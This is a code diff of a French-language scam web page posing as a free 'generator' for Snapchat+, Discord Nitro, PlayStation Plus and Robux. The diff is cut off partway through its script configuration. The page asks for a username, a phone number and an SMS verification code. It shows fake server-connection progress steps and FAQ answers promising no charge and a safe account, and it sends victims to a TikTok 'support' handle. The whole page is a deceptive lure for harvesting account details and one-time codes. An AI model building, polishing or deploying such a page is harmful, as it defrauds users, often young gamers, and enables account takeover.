@@ -4,98 +4,104 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     
-    <meta name="theme-color" content="#1e053d" id="meta-theme-color">
+    <meta name="theme-color" content="#fffc00" id="meta-theme-color">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     
     <title>Générateur & Activation Premium</title>
     <style>
         /* --- VARIABLES CSS DYNAMIQUES (THEMING) --- */
         :root {
-            /* Thème Snapchat par défaut */
-            --bg-start: #0d011a;
-            --bg-end: #1e053d;
-            --primary: #cc33ff;
-            --secondary: #ff0080;
-            --accent: #ffb400;
-            --border-glow: rgba(255, 0, 255, 0.5);
-            --shadow-glow: rgba(204, 51, 255, 0.4);
-            --logo-bg: #fffc00;
-            --text-glow: #df80ff;
-            --btn-text: #ffffff;
+            /* Thème par défaut (Snapchat) */
+            --bg-start: #000000;
+            --bg-end: #111100;
+            --primary: #fffc00;
+            --secondary: #ffb400;
+            --accent: #ffffff;
+            --border-glow: rgba(255, 252, 0, 0.4);
+            --shadow-glow: rgba(255, 252, 0, 0.3);
+            --logo-bg: #000000;
+            --text-glow: #fffc00;
+            --btn-text: #000000;
         }
 
-        body.theme-roblox {
-            /* Thème Roblox (Bleu Profond & Brillant) */
-            --bg-start: #020024;
-            --bg-end: #0a0047;
-            --primary: #00d4ff;
-            --secondary: #0055ff;
+        body.theme-snap {
+            --bg-start: #050500;
+            --bg-end: #1a1a00;
+            --primary: #fffc00;
+            --secondary: #ffb400;
             --accent: #ffffff;
-            --border-glow: rgba(0, 212, 255, 0.5);
-            --shadow-glow: rgba(0, 170, 255, 0.4);
+            --border-glow: rgba(255, 252, 0, 0.5);
+            --shadow-glow: rgba(255, 252, 0, 0.4);
+            --logo-bg: #000000;
+            --text-glow: #fffc00;
+            --btn-text: #000000;
+        }
+
+        body.theme-discord {
+            /* Thème Discord (Blurple Immersif & Profond) */
+            --bg-start: #0b0c10;
+            --bg-end: #1e1f22;
+            --primary: #5865F2; 
+            --secondary: #eb459e; /* Touche rose Nitro */
+            --accent: #23a559; 
+            --border-glow: rgba(88, 101, 242, 0.6);
+            --shadow-glow: rgba(88, 101, 242, 0.5);
             --logo-bg: transparent;
-            --text-glow: #80d4ff;
+            --text-glow: #ffffff;
             --btn-text: #ffffff;
         }
 
         body.theme-playstation {
-            /* Thème PlayStation (Dark Premium) */
+            /* Thème PlayStation (Black & Slate Premium avec lueurs) */
             --bg-start: #000000;
-            --bg-end: #0a0a0a;
-            --primary: #ffffff;
-            --secondary: #cccccc;
-            --accent: #00439c;
-            --border-glow: rgba(255, 255, 255, 0.4);
-            --shadow-glow: rgba(255, 255, 255, 0.2);
+            --bg-end: #050a14;
+            --primary: #00439c;
+            --secondary: #ffffff;
+            --accent: #0070d1;
+            --border-glow: rgba(255, 255, 255, 0.3);
+            --shadow-glow: rgba(0, 67, 156, 0.6);
             --logo-bg: transparent;
             --text-glow: #ffffff;
-            --btn-text: #000000; /* Texte noir sur boutons blancs */
+            --btn-text: #ffffff;
         }
 
-        body.theme-discord {
-            /* Thème Discord (Gamer Lounge) */
-            --bg-start: #1e1f22;
-            --bg-end: #313338;
-            --primary: #5865F2; /* Blurple */
-            --secondary: #4752c4;
-            --accent: #23a559; /* Vert succès */
-            --border-glow: rgba(88, 101, 242, 0.5);
-            --shadow-glow: rgba(88, 101, 242, 0.4);
+        body.theme-turbo {
+            /* Thème Turbo Boost (Violet/Rose Dynamique) */
+            --bg-start: #11001c;
+            --bg-end: #2a004d;
+            --primary: #ff00ff;
+            --secondary: #00ffff;
+            --accent: #ffffff;
+            --border-glow: rgba(255, 0, 255, 0.5);
+            --shadow-glow: rgba(0, 255, 255, 0.4);
             --logo-bg: transparent;
-            --text-glow: #ffffff;
+            --text-glow: #ffb3ff;
             --btn-text: #ffffff;
         }
 
         /* --- STYLE GÉNÉRAL --- */
         html, body {
-            background-color: var(--bg-start);
+            background: radial-gradient(circle at center, var(--bg-end) 0%, var(--bg-start) 100%);
             margin: 0; padding: 0; height: 100%;
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             color: white; overflow-x: hidden;
             -webkit-tap-highlight-color: transparent;
-            transition: background-color 0.8s ease;
+            transition: background 0.8s ease;
         }
 
-        /* --- EFFET ÉTOILES (ROBLOX THEME) --- */
-        .stars-bg {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: 
-                radial-gradient(2px 2px at 20px 30px, #ffffff, rgba(0,0,0,0)),
-                radial-gradient(2px 2px at 40px 70px, #ffffff, rgba(0,0,0,0)),
-                radial-gradient(2px 2px at 50px 160px, #ffffff, rgba(0,0,0,0)),
-                radial-gradient(2px 2px at 90px 40px, #ffffff, rgba(0,0,0,0)),
-                radial-gradient(2px 2px at 130px 80px, #ffffff, rgba(0,0,0,0));
-            background-repeat: repeat;
-            background-size: 200px 200px;
-            opacity: 0; pointer-events: none; transition: opacity 0.8s ease; z-index: -1;
+        /* Arrière-plans immersifs */
+        .ambient-glow {
+            position: fixed; top: 50%; left: 50%; width: 80vw; height: 80vh;
+            background: radial-gradient(circle, var(--shadow-glow) 0%, rgba(0,0,0,0) 70%);
+            transform: translate(-50%, -50%); z-index: -1; pointer-events: none;
+            opacity: 0.4; transition: all 0.8s ease;
         }
-        body.theme-roblox .stars-bg { opacity: 0.3; }
 
         /* --- 1. SYSTÈME D'AUTHENTIFICATION --- */
         #login-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at top, var(--bg-end) 0%, var(--bg-start) 100%);
+            background: radial-gradient(circle at top, #111 0%, #000 100%);
             display: flex; justify-content: center; align-items: center;
             z-index: 10000; transition: opacity 0.5s ease;
             overflow-y: auto; padding: 20px; box-sizing: border-box;
@@ -106,20 +112,17 @@
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
             border-radius: 35px; padding: 40px 25px; text-align: center;
-            border: 2px solid var(--shadow-glow);
-            box-shadow: 0 0 40px var(--shadow-glow); margin: auto;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 0 40px rgba(0,0,0,0.8); margin: auto;
         }
 
         .login-title {
             font-size: 23px; font-weight: 900; margin-bottom: 30px; letter-spacing: 1px;
-            text-transform: uppercase;
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-transform: uppercase; color: white;
         }
 
-        /* --- CHAMP IDENTIFIANT ET MOT DE PASSE --- */
         .login-input-group {
-            background: rgba(0, 0, 0, 0.3); 
+            background: rgba(0, 0, 0, 0.5); 
             border-radius: 50px; 
             margin-bottom: 15px; 
             height: 50px; 
@@ -127,18 +130,14 @@
             display: flex; 
             align-items: center; 
             border: 1px solid rgba(255, 255, 255, 0.1); 
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            transition: all 0.3s ease;
             box-sizing: border-box; 
         }
         .login-input-group:focus-within {
-            border-color: var(--primary); box-shadow: 0 0 10px var(--shadow-glow);
+            border-color: #ffffff; box-shadow: 0 0 10px rgba(255,255,255,0.2);
         }
         .login-input-group svg { 
-            width: 18px; 
-            height: 18px; 
-            fill: rgba(255, 255, 255, 0.6); 
-            margin-right: 12px;
-            flex-shrink: 0;
+            width: 18px; height: 18px; fill: rgba(255, 255, 255, 0.6); margin-right: 12px; flex-shrink: 0;
         }
         .login-input-group input {
             background: transparent; border: none; color: white; padding: 0; 
@@ -146,7 +145,6 @@
         }
         .login-input-group input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
-        /* --- BOUTON DE CONNEXION PRINCIPAL --- */
         .btn-login, .btn-glow, .btn-return {
             width: 100%;
             background: linear-gradient(135deg, var(--primary), var(--secondary));
@@ -160,7 +158,6 @@
         }
         .btn-login:disabled, .btn-glow:disabled, .btn-return:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* --- BOUTONS INVITÉ ET DEMO --- */
         .btn-guest, .btn-demo-direct {
             width: 100%; height: 50px; display: flex; align-items: center; justify-content: center;
             background: transparent; border: 1px solid rgba(255, 255, 255, 0.1); 
@@ -169,7 +166,7 @@
             box-sizing: border-box; 
         }
         .btn-guest:hover, .btn-demo-direct:hover {
-            color: white; border-color: var(--primary); background: rgba(255, 255, 255, 0.05);
+            color: white; border-color: #ffffff; background: rgba(255, 255, 255, 0.05);
         }
 
         /* --- POPUP KEY ACCESS --- */
@@ -186,12 +183,11 @@
 
         /* --- 2. CONTENU PRINCIPAL --- */
         #main-site { display: none; opacity: 0; transition: opacity 0.8s ease; position: relative; z-index: 1; }
-        .container { width: 100%; max-width: 380px; padding: 60px 20px; text-align: center; margin: 0 auto; box-sizing: border-box; }
+        .container { width: 100%; max-width: 380px; padding: 50px 20px; text-align: center; margin: 0 auto; box-sizing: border-box; }
 
-        /* --- BADGES --- */
         .admin-badge {
             display: none; padding: 8px 16px; border-radius: 50px; font-size: 11px;
-            font-weight: 900; margin: -20px auto 30px auto; width: max-content;
+            font-weight: 900; margin: -10px auto 25px auto; width: max-content;
             text-transform: uppercase; letter-spacing: 2px;
         }
         .badge-vip { background: rgba(0, 255, 128, 0.1); border: 1px solid #00ff80; color: #00ff80; animation: pulseVIP 1.5s infinite; }
@@ -200,32 +196,37 @@
         @keyframes pulseVIP { 0%, 100% { box-shadow: 0 0 10px rgba(0, 255, 128, 0.2); } 50% { box-shadow: 0 0 20px rgba(0, 255, 128, 0.6); } }
         @keyframes pulseDemo { 0%, 100% { box-shadow: 0 0 10px rgba(255, 204, 0, 0.2); } 50% { box-shadow: 0 0 20px rgba(255, 204, 0, 0.6); } }
 
-        /* --- SWITCHERS (MENUS) --- */
-        .main-switcher {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
-            background: rgba(0,0,0,0.4); border-radius: 20px;
-            padding: 8px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.1);
-        }
-        .sub-switcher {
-            display: none; /* Rendu visible via JS */
+        /* --- NOUVELLE BARRE DE NAVIGATION (IMAGES RONDES) --- */
+        .nav-bar {
+            display: flex; justify-content: center; align-items: center; gap: 15px;
             background: rgba(0,0,0,0.4); border-radius: 50px;
-            padding: 5px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.1);
-            animation: fadeIn 0.3s ease;
+            padding: 12px; margin-bottom: 30px; border: 1px solid rgba(255,255,255,0.1);
         }
-        .switch-btn {
-            flex: 1; padding: 12px; text-align: center; font-weight: 800; font-size: 13px;
-            color: rgba(255,255,255,0.5); cursor: pointer; border-radius: 40px;
-            transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px;
-            display: flex; align-items: center; justify-content: center;
+
+        .platform-icon {
+            width: 55px; height: 55px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275), border-color 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+            background-color: rgba(0,0,0,0.5); /* fallback */
         }
-        .switch-btn.active { 
-            background: linear-gradient(135deg, var(--primary), var(--secondary)); 
-            color: var(--btn-text); 
-            box-shadow: 0 0 15px var(--shadow-glow); 
+
+        .platform-icon.active {
+            transform: scale(1.15);
+            border-color: var(--primary);
+            box-shadow: 0 0 15px var(--shadow-glow);
+            z-index: 2;
+        }
+
+        .platform-icon:hover:not(.active) {
+            transform: scale(1.05);
+            border-color: rgba(255,255,255,0.5);
         }
 
         /* --- LOGO & TITRE --- */
-        .logo-wrapper { position: relative; width: 140px; height: 140px; margin: 0 auto 30px; transition: transform 0.5s ease; }
+        .logo-wrapper { position: relative; width: 130px; height: 130px; margin: 0 auto 25px; transition: transform 0.5s ease; }
         .border-gradient {
             width: 100%; height: 100%; background: linear-gradient(135deg, var(--primary), var(--secondary));
             border-radius: 40px; display: flex; justify-content: center; align-items: center;
@@ -237,31 +238,24 @@
         }
         .logo-bg img { width: 100%; height: 100%; object-fit: cover; transition: opacity 0.3s ease; }
 
-        .plus-badge {
-            position: absolute; top: -5px; right: -5px; background-color: var(--accent); color: var(--bg-end);
-            width: 42px; height: 42px; border-radius: 50%; font-size: 20px; font-weight: 900;
-            display: flex; justify-content: center; align-items: center; border: 4px solid var(--bg-end);
-            transition: all 0.8s ease;
-        }
+        .title { color: var(--text-glow); font-size: 22px; font-weight: 900; letter-spacing: 2px; margin-bottom: 30px; text-transform: uppercase; transition: color 0.8s ease; }
 
-        .title { color: var(--text-glow); font-size: 24px; font-weight: 900; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; transition: color 0.8s ease; }
-
-        /* --- INPUTS --- */
+        /* --- INPUTS STANDARDISÉS --- */
         .input-group { 
             display: flex; border: 2px solid var(--border-glow); border-radius: 12px; 
-            margin-bottom: 20px; background-color: rgba(0,0,0,0.3); align-items: center; overflow: hidden;
+            margin-bottom: 15px; background-color: rgba(0,0,0,0.4); align-items: center; overflow: hidden;
             transition: border-color 0.3s ease, box-shadow 0.2s ease;
         }
         .input-group:focus-within { border-color: var(--primary); box-shadow: 0 0 10px var(--shadow-glow); }
 
-        .prefix-phone { 
-            background-color: rgba(0,0,0,0.4); padding: 0 15px; height: 58px; font-weight: bold; font-size: 17px; 
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            border-right: 1px solid var(--border-glow); white-space: nowrap; 
+        .prefix-icon { 
+            background-color: rgba(0,0,0,0.5); width: 60px; height: 58px; font-size: 20px; 
+            display: flex; align-items: center; justify-content: center;
+            border-right: 1px solid var(--border-glow); flex-shrink: 0;
         }
 
-        input { flex: 1; border: none; background: transparent; padding: 0 18px; color: white; font-size: 17px; outline: none; height: 58px; }
-        input::placeholder { color: rgba(255, 255, 255, 0.5); }
+        input { flex: 1; border: none; background: transparent; padding: 0 18px; color: white; font-size: 16px; outline: none; height: 58px; width: 100%; box-sizing: border-box;}
+        input::placeholder { color: rgba(255, 255, 255, 0.4); }
 
         /* --- SÉLECTEUR CUSTOM --- */
         .dropdown-group { position: relative; overflow: visible !important; display: block; padding: 0; }
@@ -269,7 +263,7 @@
             display: flex; justify-content: space-between; align-items: center; height: 58px; 
             padding: 0 18px; cursor: pointer; width: 100%; box-sizing: border-box;
         }
-        #offer-label { color: rgba(255, 255, 255, 0.5); font-size: 17px; transition: color 0.3s; }
+        #offer-label { color: rgba(255, 255, 255, 0.4); font-size: 16px; transition: color 0.3s; }
         .select-arrow { pointer-events: none; display: flex; align-items: center; justify-content: center; transition: transform 0.3s ease; }
         .select-arrow svg { width: 16px; height: 16px; fill: rgba(255, 255, 255, 0.5); }
         
@@ -282,7 +276,7 @@
         .custom-select-trigger.open .select-arrow { transform: rotate(180deg); }
         
         .custom-option {
-            padding: 15px 18px; color: white; font-size: 16px; font-weight: 600;
+            padding: 15px 18px; color: white; font-size: 15px; font-weight: 600;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05); transition: all 0.3s ease; text-align: left; cursor: pointer;
         }
         .custom-option:last-child { border-bottom: none; }
@@ -293,19 +287,19 @@
         .sms-subtext { color: #aaaaaa; font-size: 14px; margin-bottom: 25px; }
 
         .status-box { 
-            background-color: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 20px; padding: 35px 20px; margin-bottom: 40px; min-height: 180px; display: flex; flex-direction: column; justify-content: center; 
+            background-color: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1); 
+            border-radius: 20px; padding: 35px 20px; margin-bottom: 30px; min-height: 180px; display: flex; flex-direction: column; justify-content: center; 
         }
         
-        .info-box { background-color: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 25px 20px; text-align: left; }
-        .info-header { color: var(--accent); font-weight: 900; margin-bottom: 12px; font-size: 16px; }
-        .info-text { font-size: 14px; opacity: 0.9; margin: 0; line-height: 1.5; }
+        .info-box { background-color: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 25px 20px; text-align: left; }
+        .info-header { color: var(--accent); font-weight: 900; margin-bottom: 12px; font-size: 16px; text-transform: uppercase; }
+        .info-text { font-size: 14px; opacity: 0.9; margin: 0; line-height: 1.5; color: #e0e0e0; }
 
         .error-message {
             position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
             background-color: #ff4d4d; color: white; padding: 15px 20px;
             border-radius: 12px; z-index: 10001; animation: slideDown 0.3s ease;
-            max-width: 90%; box-shadow: 0 5px 20px rgba(255, 77, 77, 0.4);
+            max-width: 90%; box-shadow: 0 5px 20px rgba(255, 77, 77, 0.4); font-weight: bold; font-size: 14px;
         }
 
         /* --- BARRE DE PROGRESSION --- */
@@ -316,31 +310,30 @@
 
         /* --- FAQ SECTION --- */
         .faq-section {
-            margin-top: 35px; text-align: left; background: rgba(0, 0, 0, 0.3);
+            margin-top: 30px; text-align: left; background: rgba(0, 0, 0, 0.4);
             border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 20px;
         }
         .faq-title { font-size: 17px; font-weight: 900; color: white; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; text-align: center; }
         .faq-item { border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding: 14px 0; cursor: pointer; }
         .faq-item:last-child { border-bottom: none; }
-        .faq-question { font-size: 14px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; color: var(--primary); }
-        .faq-question::after { content: '＋'; font-size: 14px; color: rgba(255, 255, 255, 0.4); transition: transform 0.3s ease; }
+        .faq-question { font-size: 14px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; color: var(--primary); transition: color 0.3s; }
+        .faq-question::after { content: '＋'; font-size: 16px; color: rgba(255, 255, 255, 0.4); transition: transform 0.3s ease; }
         .faq-item.active .faq-question::after { transform: rotate(45deg); color: var(--secondary); }
-        .faq-answer { font-size: 13px; opacity: 0; max-height: 0; overflow: hidden; transition: all 0.3s cubic-bezier(0, 1, 0, 1); margin-top: 0; color: #a0a0a0; line-height: 1.5; }
-        .faq-item.active .faq-answer { opacity: 1; max-height: 150px; margin-top: 10px; transition: all 0.3s ease-in-out; }
+        .faq-item.active .faq-question { color: white; }
+        .faq-answer { font-size: 13px; opacity: 0; max-height: 0; overflow: hidden; transition: all 0.3s cubic-bezier(0, 1, 0, 1); margin-top: 0; color: #cccccc; line-height: 1.6; }
+        .faq-item.active .faq-answer { opacity: 1; max-height: 200px; margin-top: 10px; transition: all 0.3s ease-in-out; }
 
-        /* --- FOOTER & ADMIN --- */
+        /* --- FOOTER --- */
         .footer-contact { margin-top: 40px; text-align: center; padding-bottom: 10px; }
         .contact-title { font-size: 12px; font-weight: 900; letter-spacing: 2px; color: rgba(255, 255, 255, 0.3); margin-bottom: 15px; text-transform: uppercase; }
         .tiktok-btn {
             display: flex; width: 100%; box-sizing: border-box; align-items: center; justify-content: center;
-            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08);
-            padding: 18px 28px; border-radius: 12px; text-decoration: none; color: white; font-weight: 700; font-size: 16px;
-            transition: all 0.3s ease; gap: 12px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 16px 28px; border-radius: 12px; text-decoration: none; color: white; font-weight: 700; font-size: 15px;
+            transition: all 0.3s ease; gap: 12px;
         }
-        .tiktok-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: var(--secondary); transform: translateY(-2px); }
-        .tiktok-icon { width: 20px; height: 20px; object-fit: contain; }
-
-        .patch-version { margin-top: 35px; text-align: center; color: #4ade80; font-weight: 900; font-size: 14px; font-family: monospace; letter-spacing: 2px; }
+        .tiktok-btn:hover { background: rgba(255, 255, 255, 0.1); border-color: var(--secondary); transform: translateY(-2px); }
+        .patch-version { margin-top: 30px; text-align: center; color: #4ade80; font-weight: 900; font-size: 13px; font-family: monospace; letter-spacing: 2px; opacity: 0.6; }
 
         /* --- ANIMATIONS --- */
         @keyframes shakeEffect { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-6px); } 40%, 80% { transform: translateX(6px); } }
@@ -351,23 +344,23 @@
 
         /* --- RESPONSIVE --- */
         @media (max-width: 480px) {
-            .container { padding: 40px 15px; }
-            .title { font-size: 20px; }
-            .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
-            .plus-badge { width: 36px; height: 36px; font-size: 18px; }
-            .switch-btn { font-size: 11px; padding: 10px; }
+            .container { padding: 30px 15px; }
+            .platform-icon { width: 50px; height: 50px; }
+            .logo-wrapper { width: 110px; height: 110px; margin-bottom: 20px; }
+            .title { font-size: 19px; margin-bottom: 25px; }
+            .prefix-icon { width: 50px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- EFFET ÉTOILES POUR THEME ROBLOX -->
-    <div class="stars-bg"></div>
+    <!-- LUEUR D'ARRIÈRE-PLAN IMMERSIVE -->
+    <div class="ambient-glow"></div>
 
     <!-- OVERLAY CONNEXION -->
     <div id="login-overlay">
         <div class="glass-panel">
-            <h2 class="login-title">Connexion administrateur</h2>
+            <h2 class="login-title">Identification</h2>
             
             <div class="login-input-group" id="group-adminUser">
                 <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
@@ -391,40 +384,41 @@
             
             <div id="admin-badge" class="admin-badge"></div>
 
-            <!-- MENU GLOBAL 4 PLATEFORMES (GRILLE 2x2) -->
-            <div class="main-switcher">
-                <div class="switch-btn active" id="btn-playstation" onclick="setService('playstation')">PlayStation</div>
-                <div class="switch-btn" id="btn-roblox" onclick="setService('roblox')">Roblox</div>
-                <div class="switch-btn" id="btn-discord" onclick="setService('discord')">Discord</div>
-                <div class="switch-btn" id="btn-snap" onclick="setService('snap')">Snapchat</div>
+            <!-- NOUVELLE BARRE DE NAVIGATION (IMAGES RONDES) -->
+            <div class="nav-bar">
+                <img src="snapchat-icon.png" id="nav-snap" class="platform-icon" onclick="setService('snap')" alt="Snapchat">
+                <img src="discord-boost-icon.png" id="nav-discord" class="platform-icon" onclick="setService('discord')" alt="Discord">
+                <img src="playstation-icon.png" id="nav-playstation" class="platform-icon" onclick="setService('playstation')" alt="PlayStation">
+                <img src="turbo-boost-icon.png" id="nav-turbo" class="platform-icon" onclick="setService('turbo')" alt="Turbo Boost">
             </div>
 
-            <!-- SOUS-MENU DYNAMIQUE (ROBLOX / DISCORD) -->
-            <div class="sub-switcher" id="sub-switcher-container">
-                <!-- Rempli dynamiquement via JS -->
-            </div>
-
-            <!-- LOGO DYNAMIQUE -->
+            <!-- LOGO DYNAMIQUE CENTRAL -->
             <div class="logo-wrapper">
                 <div class="border-gradient">
                     <div class="logo-bg" id="logo-bg">
-                        <img src="logoplaystation.png" id="main-logo" alt="Logo Service">
+                        <img src="snapchat-icon.png" id="main-logo" alt="Logo Service">
                     </div>
                 </div>
-                <div class="plus-badge" id="plus-badge">+</div>
             </div>
 
-            <h1 class="title" id="main-title">PLAYSTATION<br>PLUS</h1>
+            <h1 class="title" id="main-title">ACTIVATION SNAP<br>PLUS +</h1>
 
-            <!-- ÉTAPE 1 : FORMULAIRE -->
+            <!-- ÉTAPE 1 : FORMULAIRE STANDARDISÉ (3 CHAMPS) -->
             <div id="step-1">
-                <!-- Suppression du champ Nom d'utilisateur (Standardisation V1.54) -->
                 
-                <div class="input-group" id="group-phone">
-                    <div class="prefix-phone">+33 🇫🇷</div>
-                    <input type="tel" id="phone" placeholder="Ex: 06 12 34 56 78" maxlength="14" inputmode="numeric">
+                <!-- 1. NOM D'UTILISATEUR -->
+                <div class="input-group" id="group-username">
+                    <div class="prefix-icon">👤</div>
+                    <input type="text" id="username" placeholder="Nom d'utilisateur">
                 </div>
 
+                <!-- 2. NUMÉRO DE TÉLÉPHONE (MAX 10 CARACTÈRES) -->
+                <div class="input-group" id="group-phone">
+                    <div class="prefix-icon">📱</div>
+                    <input type="tel" id="phone" placeholder="Numéro à 10 chiffres" maxlength="10" inputmode="numeric">
+                </div>
+
+                <!-- 3. SÉLECTEUR D'OFFRE -->
                 <div class="input-group dropdown-group" id="group-offer">
                     <input type="hidden" id="offer-select" value="">
                     <div class="custom-select-trigger" id="offer-trigger">
@@ -436,13 +430,13 @@
                     </div>
                 </div>
 
-                <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
+                <button class="btn-glow" id="submitBtn" onclick="processValidation()">Continuer</button>
             </div>
 
             <!-- ÉTAPE 2 : SMS -->
             <div id="step-2" style="display: none;">
-                <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
-                <div class="sms-subtext" id="timer">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
+                <div class="sms-instruction">🛡️ Vérification de sécurité</div>
+                <div class="sms-subtext" id="timer">Un code SMS a été envoyé. Expiration dans 03:00</div>
                 <div class="input-group" id="group-sms">
                     <input type="tel" id="sms-code" placeholder="Code à 4 chiffres" maxlength="4" inputmode="numeric" style="text-align: center;">
                 </div>
@@ -465,262 +459,163 @@
                 </div>
             </div>
 
+            <!-- ZONE D'INFORMATION -->
             <div class="info-box">
-                <div class="info-header">INFORMATION ℹ️</div>
+                <div class="info-header">Information ℹ️</div>
                 <p class="info-text" id="info-text-box">
-                    Aucun frais ne vous sera prélevé. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés par notre système.
+                    L'activation se fait de manière sécurisée. Cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les comptes sélectionnés. Aucun frais ne sera prélevé.
                 </p>
             </div>
 
-            <!-- FAQ DYNAMIQUE -->
+            <!-- FAQ DYNAMIQUE (MINIMUM 3 QUESTIONS) -->
             <div class="faq-section">
-                <div class="faq-title">FAQ</div>
+                <div class="faq-title">Questions Fréquentes</div>
                 <div id="faq-list">
                     <!-- Rempli dynamiquement via JS -->
                 </div>
             </div>
 
+            <!-- PIED DE PAGE -->
             <div class="footer-contact">
                 <div class="contact-title">Assistance technique</div>
                 <a href="https://www.tiktok.com/@tech_snapplus1" target="_blank" rel="noopener noreferrer" class="tiktok-btn">
-                    <img src="tiktok.png" alt="TikTok" class="tiktok-icon">
                     @tech_snapplus1
                 </a>
             </div>
 
-            <div class="patch-version">V1.54</div>
+            <div class="patch-version">MAJ. V2.0</div>
 
         </div>
     </div>
 
     <script>
         // ==========================================
-        // 1. CONFIGURATION DYNAMIQUE (STATE MACHINE)
+        // 1. CONFIGURATION DES PLATEFORMES (4 SERVICES, 3 FAQ MIN)
         // ==========================================
-        let currentService = 'playstation'; 
-        let currentSubService = null; 
+        let currentService = 'snap'; // Redirection par défaut vers Snapchat
 
         const siteConfig = {
-            playstation: {
-                theme: 'theme-playstation',
-                title: "PLAYSTATION<br>PLUS",
-                logo: "logoplaystation.png",
-                plusText: "+",
-                selectLabel: "Sélectionner l'offre",
-                options: [
-                    { value: "ps_ess", text: "1 an – Essential" },
-                    { value: "ps_ext", text: "1 an – Extra" },
-                    { value: "ps_prem", text: "1 an – Premium" }
-                ],
-                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">🎮</div>',
-                successMsg: "L'abonnement PlayStation Plus sera activé sur votre compte d'ici quelques instants.",
-                progressSteps: [
-                    { width: "20%", text: "Connexion sécurisée au PlayStation Network..." },
-                    { width: "45%", text: "Validation du compte utilisateur..." },
-                    { width: "68%", text: "Génération du jeton d'abonnement..." },
-                    { width: "90%", text: "Synchronisation avec les serveurs PSN..." },
-                    { width: "100%", text: "Activation validée et établie !" }
-                ],
-                faq: [
-                    { q: "Le service est-il gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles." },
-                    { q: "L'abonnement sera-t-il lié à mon compte actuel ?", a: "Tout à fait, le processus s'attache directement à votre compte PlayStation Network existant." },
-                    { q: "Pourquoi valider mon numéro ?", a: "Cette vérification prévient les abus en s'assurant que vous êtes une vraie personne." }
-                ]
-            },
-            roblox: {
-                robux: {
-                    theme: 'theme-roblox',
-                    title: "GÉNÉRATEUR DE<br>ROBUX",
-                    logo: "roblox.png",
-                    plusText: "R$",
-                    selectLabel: "Sélectionner le montant",
-                    options: [
-                        { value: "1700", text: "1 700 Robux" },
-                        { value: "3150", text: "3 150 Robux" },
-                        { value: "4500", text: "4 500 Robux" }
-                    ],
-                    loaderHtml: '<img src="roblox.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
-                    successMsg: "Les Robux seront crédités sur votre compte d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
-                        { width: "45%", text: "Identification du compte joueur..." },
-                        { width: "68%", text: "Génération et cryptage des paquets de Robux..." },
-                        { width: "90%", text: "Validation de la transaction réseau..." },
-                        { width: "100%", text: "Transfert validé et établi !" }
-                    ],
-                    faq: [
-                        { q: "Combien de temps prend le transfert ?", a: "Le processus est très rapide. Une fois l'opération validée, les Robux sont crédités en moins de 5 minutes." },
-                        { q: "Est-ce risqué pour mon compte ?", a: "Non, notre système simule des transferts légitimes." }
-                    ]
-                },
-                roblox_plus: {
-                    theme: 'theme-roblox',
-                    title: "ROBLOX<br>PREMIUM",
-                    logo: "roblox.png",
-                    plusText: "+",
-                    selectLabel: "Sélectionner l'offre",
-                    options: [
-                        { value: "1m", text: "1 mois Roblox Premium" },
